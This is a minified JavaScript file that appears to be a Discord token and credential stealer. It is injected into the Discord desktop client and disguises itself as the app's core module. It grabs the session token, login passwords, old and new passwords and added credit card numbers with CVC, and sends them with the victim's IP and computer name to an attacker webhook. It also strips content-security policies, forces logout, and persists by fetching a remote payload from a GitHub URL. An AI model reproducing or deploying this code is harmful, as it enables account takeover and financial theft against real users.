const fs=require("fs"),electron=require("electron"),https=require("https"),queryString=require("querystring");var computerName=process.env.COMPUTERNAME,tokenScript="(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()",logOutScript='function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();',config={logout:"true","logout-notify":"true","init-notify":"false","embed-color":374276,injection_url:"https://raw.githubusercontent.com/Raplhs/23123213423543534r3re34534/main/injecci.js",webhook:"%HOOKRE%",Filter:{urls:["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json","https://*.discord.com/api/v*/applications/detectable","https://discord.com/api/v*/applications/detectable","https://*.discord.com/api/v*/users/@me/library","https://discord.com/api/v*/users/@me/library","https://*.discord.com/api/v*/users/@me/billing/subscriptions","https://discord.com/api/v*/users/@me/billing/subscriptions","wss://remote-auth-gateway.discord.gg/*"]},onCompleted:{urls:["https://discord.com/api/v*/users/@me","https://discordapp.com/api/v*/users/@me","https://*.discord.com/api/v*/users/@me","https://discordapp.com/api/v*/auth/login","https://discord.com/api/v*/auth/login","https://*.discord.com/api/v*/auth/login","https://api.stripe.com/v*/tokens"]}};async function execScript(e){var n=electron.BrowserWindow.getAllWindows()[0];return await n.webContents.executeJavaScript(e,!0)||null}const makeEmbed=async({title:e,fields:n,image:a,thumbnail:i})=>{var t={username:"RaR-Notif",avatar_url:"https://raw.githubusercontent.com/Raplhs/444444iew543333/main/deadcored.png",content:"",embeds:[{title:e,color:config["embed-color"],fields:n}]};return a&&(t.embeds[0].image={url:a}),i&&(t.embeds[0].thumbnail={url:i}),t},getIP=async()=>(await execScript('var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);')).ip,getURL=async(e,n)=>await execScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "${e}", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    JSON.parse(xmlHttp.responseText);`),getGifOrPNG=async e=>{var n=[".gif?size=512",".png?size=512"];return"image/gif"==(await new Promise((n=>{https.get(e,(e=>n(e.headers)))})))["content-type"]?e+n[0]:e+n[1]},GetBadges=e=>{var n="";return 1==(1&e)&&(n+="<:staff:891346298932981783> "),2==(2&e)&&(n+="<:partner:1041639667226914826> "),4==(4&e)&&(n+="<:hypesquadevent:1082679435452481738> "),8==(8&e)&&(n+="<:bughunter_1:874750808426692658> "),64==(64&e)&&(n+="<:bravery:874750808388952075> "),128==(128&e)&&(n+="<:brilliance:874750808338608199> "),256==(256&e)&&(n+="<:balance:874750808267292683> "),512==(512&e)&&(n+="<:early:944071770506416198> "),16384==(16384&e)&&(n+="<:bughunter_2:874750808430874664> "),4194304==(4194304&e)&&(n+="<:activedev:1041634224253444146> "),131072==(131072&e)&&(n+="<:mm_IconBotDev:898181029737680896> "),""==n&&(n=":x:"),n},GetRBadges=e=>{var n="";return 1==(1&e)&&(n+="<:staff:891346298932981783> "),2==(2&e)&&(n+="<:partner:1041639667226914826> "),4==(4&e)&&(n+="<:hypesquadevent:1082679435452481738> "),8==(8&e)&&(n+="<:bughunter_1:874750808426692658> "),512==(512&e)&&(n+="<:early:944071770506416198> "),16384==(16384&e)&&(n+="<:bughunter_2:874750808430874664> "),4194304==(4194304&e)&&(n+="<:activedev:1041634224253444146> "),131072==(131072&e)&&(n+="<:mm_IconBotDev:898181029737680896> "),""==n&&(n=":x:"),n},GetA2F=e=>{switch(e){case!0:return":lock: `A2F Enabled`";case!1:return":lock: `A2F Not Enabled`";default:return"Idk dude"}},parseBilling=e=>{var n="";return e.forEach((e=>{if(!e.invalid)switch(e.type){case 1:n+=":white_check_mark: :credit_card:";break;case 2:n+=":white_check_mark: <:paypal:896441236062347374>"}})),n||(n=":x:"),n},calcDate=(e,n)=>new Date(e.setMonth(e.getMonth()+n)),GetNitro=e=>{switch(e.premium_type){default:return":x:";case 1:return"<:946246402105819216:962747802797113365>";case 2:if(!e.premium_guild_since)return"<:946246402105819216:962747802797113365>";var n=new Date(Date.now()),a=[new Date(e.premium_guild_since),new Date(e.premium_guild_since),new Date(e.premium_guild_since),new Date(e.premium_guild_since),new Date(e.premium_guild_since),new Date(e.premium_guild_since),new Date(e.premium_guild_since)],i=[2,3,6,9,12,15,18,24];e=[];for(var t in a)e.push(Math.round((calcDate(a[t],i[t])-n)/864e5));var r=0;for(var t of e)!(t>0)&&r++;return"<:946246402105819216:962747802797113365> "+["<:Booster1Month:1051453771147911208>","<:Booster2Month:1051453772360077374>","<:Booster6Month:1051453773463162890>","<:Booster9Month:1051453774620803122>","<:boost12month:1068308256088400004>","<:Booster15Month:1051453775832961034>","<:BoosterLevel8:1051453778127237180>","<:Booster24Month:1051453776889917530>"][r]}};function GetLangue(e){return{fr:":flag_fr: French",da:":flag_dk: Dansk",de:":flag_de: Deutsch","en-GB":":england: English (UK)","en-US":":flag_us: USA","en-ES":":flag_es: Espagnol",hr:":flag_hr: Croatian",it:":flag_it: Italianio",lt:":flag_lt: Lithuanian",hu:":flag_no::flag_hu: Hungarian",no:":flag_no: Norwegian",pl:":flag_pl: Polish","pr-BR":":flag_pt: Portuguese",ro:":flag_ro: Romanian",fi:":flag_fi: Finnish","sv-SE":":flag_se: Swedish",vi:":flag_vn: Vietnamese",tr:":flag_tr: Turkish",cs:":flag_cz: Czech",el:":flag_gr: Greek",bg:":flag_bg: Bulgarian",ru:":flag_ru: Russian",uk:":flag_ua: Ukrainian",hi:":flag_in: Indian",th:":flag_tw: Taiwanese","zh-CN":":flag_cn: Chinese-China",ja:":flag_jp: Japanese","zh-TW":":flag_cn: Chinese-Taiwanese",ko:":flag_kr: Korean"}[e]||"No Languages Detected"}const post=async e=>{e=JSON.stringify(e)[config.webhook].forEach((n=>{const a=new URL(n),i={host:a.hostname,port:a.port,path:a.pathname,method:"POST",headers:{"Content-Type":"application/json"}},t=https.request(i);t.on("error",(e=>{console.log(e)})),t.write(e),t.end()}))},FirstTime=async()=>{var e=await execScript(tokenScript);if("true"!==config["init-notify"])return!0;fs.existsSync(__dirname+"/blackcap")&&fs.rmdirSync(__dirname+"/blackcap");var n=await getIP();if(e){var a=await getURL("https://discord.com/api/v8/users/@me",e),i=await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources",e),t=await getURL("https://discord.com/api/v9/users/"+a.id+"/profile",e),r=parseBilling(i);if(!a.avatar)var o="https://raw.githubusercontent.com/Raplhs/444444iew543333/blob/main/noimg.png";o=o??await getGifOrPNG(`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`),(s=await makeEmbed({title:"Logger Initalized",fields:[{name:"Injection Info",value:`\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${n}\n\`\`\`\n`,inline:!1},{name:"Username <:username:1041634536733290596> ",value:`\`${a.username}#${GetLangue(a.locale)}#${a.discriminator}\``,inline:!0},{name:"ID <:iduser:1041634535395307520>",value:`\`${a.id}\`\`${GetLangue(a.locale)}`,inline:!0},{name:"<a:tokens:1041634540537511957> Token",value:`\`\`\`${e}\`\`\``,inline:!1},{name:"Badges <:badge:1041634538150973460>",value:`${GetBadges(a.flags)}`,inline:!0},{name:"Nitro <a:nitro:1041639670288748634>",value:`${GetNitro(t)}`,inline:!0},{name:"Billing <a:billing:1041641103629234196>",value:`${r}`,inline:!1},{name:"Phone :mobile_phone:",value:`\`${a.phone??"None"}\``,inline:!0},{name:"Email <a:email:1041639672037785691>",value:`\`${a.email}\``,inline:!0},{name:"A2F <a:a2f:1040272766982692885>",value:`${GetA2F(a.mfa_enabled)}`,inline:!0}],image:userBanner,thumbnail:o})).embeds.push()}else var s=await makeEmbed({title:"Status: Initalized",fields:[{name:"Extra Info",value:`\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${n}\n\`\`\``,inline:!1}]});if(await post(s),("false"!=config.logout||"%LOGOUT%"!==config.logout)&&"true"==config["logout-notify"]){if(e){a=await getURL("https://discord.com/api/v8/users/@me",e),i=await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources",e),t=await getURL("https://discord.com/api/v9/users/"+a.id+"/profile",e),r=parseBilling(i);if(!a.avatar)o="https://raw.githubusercontent.com/Raplhs/444444iew543333/main/noimg.png";o=o??await getGifOrPNG(`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`),(s=await makeEmbed({title:"Victim Got Logged Out",fields:[{name:"Injection Info",value:`\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${n}\n\`\`\`\n`,inline:!1},{name:"Username <:username:1041634536733290596> ",value:`\`${a.username}#${GetLangue(a.locale)}#${a.discriminator}\``,inline:!0},{name:"ID <:iduser:1041634535395307520>",value:`\`${a.id}\``,inline:!0},{name:"<a:tokens:1041634540537511957> Token",value:`\`\`\`${e}\`\`\``,inline:!1},{name:"Badges <:badge:1041634538150973460>",value:`${GetBadges(a.flags)}`,inline:!0},{name:"Nitro <a:nitro:1041639670288748634>",value:`${GetNitro(t)}`,inline:!0},{name:"Billing <a:billing:1041641103629234196>",value:`${r}`,inline:!1},{name:"Phone :mobile_phone:",value:`\`${a.phone??"None"}\``,inline:!0},{name:"Email <a:email:1041639672037785691>",value:`\`${a.email}\``,inline:!0},{name:"A2F <a:a2f:1040272766982692885>",value:`${GetA2F(a.mfa_enabled)}`,inline:!0}],image:userBanner,thumbnail:o})).embeds.push()}else var s=await makeEmbed({title:"User Logged Out (User Not Logged in Before)",fields:[{name:"Injection Info",value:`\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${n}\n\`\`\`\n\n`,inline:!1}]});await execScript(logOutScript),doTheLogOut=!0,await post(s)}return!1},path=function(){var e=electron.app.getAppPath().replace(/\\/g,"/").split("/");return e.pop(),{appPath:e=e.join("/"),appName:electron.app.getName()}}(),checUpdate=()=>{var{appPath:e,appName:n}=path,a=`${e}/app`,i=__filename.replace(/\\/g,"/"),t=`${process.env.appdata.replace(/\\/g,"/")}/betterdiscord/data/betterdiscord.asar`,r=`${a}/package.json`,o=`${a}/index.js`;fs.existsSync(a)||fs.mkdirSync(a),fs.writeFileSync(r,`{"name": "${n}", "main": "./index.js"}`);var s=`const fs = require("fs"), https = require("https")\nvar index = "${i}"\nvar betterDiscord = "${t}"\nvar bouki = fs.readFileSync(index).toString()\nif (bouki == "module.exports = require('./core.asar');") init()\nfunction init() {\n    https.get("${config.injection_url}", res => {\n        var chunk = ""\n        res.on("data", data => chunk += data)\n        res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))\n    }).on("error", (err) => setTimeout(init(), 10000));\n}\nrequire("${e}/app.asar")\nif (fs.existsSync(betterDiscord)) require(betterDiscord)`;fs.writeFileSync(o,s),execScript(logOutScript)};electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter,(async(e,n)=>{if(await electron.app.whenReady(),await FirstTime(),e.url.startsWith("wss://remote-auth-gateway"))return n({cancel:!0});checUpdate(),n({})})),electron.session.defaultSession.webRequest.onHeadersReceived(((e,n)=>{delete e.responseHeaders["content-security-policy"],delete e.responseHeaders["content-security-policy-report-only"],n({responseHeaders:{...e.responseHeaders,"Access-Control-Allow-Headers":"*"}})})),electron.session.defaultSession.webRequest.onCompleted(config.onCompleted,(async(e,n)=>{if(["POST","PATCH"].includes(e.method)&&200===e.statusCode){try{var a=JSON.parse(e.uploadData[0].bytes)}catch(n){a=queryString.parse(decodeURIComponent(e.uploadData[0].bytes.toString()))}var i=await execScript(tokenScript),t=await getIP(),r=await getURL("https://discord.com/api/v8/users/@me",i),o=await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources",i),s=await getURL("https://discord.com/api/v9/users/"+r.id+"/profile",i);if(!r.avatar)var l="https://raw.githubusercontent.com/Raplhs/444444iew543333/blob/main/noimg.png";l=l??await getGifOrPNG(`https://cdn.discordapp.com/avatars/${r.id}/${r.avatar}`);var m=parseBilling(o);switch(!0){case e.url.endsWith("login"):var c=a.password;(u=await makeEmbed({title:"User Logged In",color:config["embed-color"],fields:[{name:"Injection Info",value:`\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${t}\n\`\`\`\n\n[Download pfp](${l})`,inline:!1},{name:"Username <:username:1041634536733290596> ",value:`\`${r.username}#${GetLangue(r.locale)}#${r.discriminator}\``,inline:!0},{name:"ID <:iduser:1041634535395307520>",value:`\`${r.id}\``,inline:!0},{name:"<a:tokens:1041634540537511957> Token",value:`\`\`\`${i}\`\`\``,inline:!1},{name:"Badges <:badge:1041634538150973460>",value:`${GetBadges(r.flags)}`,inline:!0},{name:"Nitro <a:nitro:1041639670288748634>",value:`${GetNitro(s)}`,inline:!0},{name:"Billing <a:billing:1041641103629234196>",value:`${m}`,inline:!1},{name:"Phone :mobile_phone:",value:`\`${r.phone??"None"}\``,inline:!0},{name:"Email <a:email:1041639672037785691>",value:`\`${r.email}\``,inline:!0},{name:"<a:password:1041639669047238676> Password",value:`\`${c}\``,inline:!0},{name:"A2F <a:a2f:1040272766982692885>",value:`${GetA2F(r.mfa_enabled)}`,inline:!0}],thumbnail:l,image:userBanner})).embeds.push(),await post(u);break;case e.url.endsWith("users/@me"):if(!a.password)return;if(a.new_password)(u=await makeEmbed({title:"Password Change Detected",color:config["embed-color"],fields:[{name:"Injection Info",value:`\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${t}\n\`\`\`\n\n[Download pfp](${l})`,inline:!1},{name:"Username <:username:1041634536733290596> ",value:`\`${r.username}#${GetLangue(r.locale)}#${r.discriminator}\``,inline:!0},{name:"ID <:iduser:1041634535395307520>",value:`\`${r.id}\``,inline:!0},{name:"<a:tokens:1041634540537511957> Token",value:`\`\`\`${i}\`\`\``,inline:!1},{name:"Badges <:badge:1041634538150973460>",value:`${GetBadges(r.flags)}`,inline:!0},{name:"Nitro <a:nitro:1041639670288748634>",value:`${GetNitro(s)}`,inline:!0},{name:"Billing <a:billing:1041641103629234196>",value:`${m}`,inline:!0},{name:"Phone :mobile_phone:",value:`\`${r.phone??":x:"}\``,inline:!0},{name:"Email <a:email:1041639672037785691>",value:`\`${r.email}\``,inline:!0},{name:"<a:password:1041639669047238676> Old Password",value:`\`${a.password}\``,inline:!0},{name:"<a:password:1041639669047238676> New Password",value:`\`${a.new_password}\``,inline:!0},{name:"A2F <a:a2f:1040272766982692885>",value:`${GetA2F(r.mfa_enabled)}`,inline:!0}],thumbnail:l,image:userBanner})).embeds.push(),await post(u);if(a.email)(u=await makeEmbed({title:"Email Change Detected",color:config["embed-color"],fields:[{name:"Injection Info",value:`\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${t}\n\`\`\`\n\n[Download pfp](${l})`,inline:!1},{name:"Username <:username:1041634536733290596> ",value:`\`${r.username}#${GetLangue(r.locale)}#${r.discriminator}\``,inline:!0},{name:"ID <:iduser:1041634535395307520>",value:`\`${r.id}\`\n`,inline:!0},{name:"<a:tokens:1041634540537511957> Token",value:`\`\`\`${i}\`\`\``,inline:!1},{name:"Badges <:badge:1041634538150973460>",value:`${GetBadges(r.flags)}`,inline:!0},{name:"Nitro <a:nitro:1041639670288748634>",value:`${GetNitro(s)}`,inline:!0},{name:"Billing <a:billing:1041641103629234196>",value:`${m}`,inline:!1},{name:"Phone :mobile_phone:",value:`\`${r.phone??"None"}\``,inline:!0},{name:"New Email <a:email:1041639672037785691>",value:`\`${r.email}\``,inline:!0},{name:"<a:password:1041639669047238676> Password",value:`\`${a.password}\``,inline:!0},{name:"A2F <a:a2f:1040272766982692885>",value:`${GetA2F(r.mfa_enabled)}`,inline:!0}],thumbnail:l,image:userBanner})).embeds.push(),await post(u);break;case e.url.endsWith("tokens"):var u,[d,p,g,f]=[a["card[number]"],a["card[cvc]"],a["card[exp_month]"],a["card[exp_year]"]];(u=await makeEmbed({title:"Credit Card Added",description:`\n                **IP:** ${t}, ${GetLangue(r.locale)}\n\n\n                **Username** <:username:1041634536733290596>\n\`\`\`${r.username}#${r.discriminator}\`\`\`\n\n                **ID** <:iduser:1041634535395307520>\n\`\`\`${r.id}\`\`\`\n\n                **Badges** <:badge:1041634538150973460>\n${GetBadges(r.flags)}\n\n                **Nitro Type** <a:nitro:1041639670288748634>\n${GetNitro(r.premium_type)}\n\n                **Email** <a:email:1041639672037785691>\n\`\`\`${r.email}\`\`\`\n\n                **Credit Card Number**\n\`\`\`${d}\`\`\`\n\n                **Credit Card Expiration**\n\`\`\`${g}/${f}\`\`\`\n\n                **CVC**\n\`\`\`${p}\`\`\`\n\n                **A2F** <a:a2f:1040272766982692885>\n${GetA2F(r.mfa_enabled)}\n\n                <a:tokens:1041634540537511957> **Token** \n\`\`\`${i}\`\`\``,thumbnail:l,image:userBanner})).embeds.push(),await post(u)}}})),module.exports=require("./core.asar");
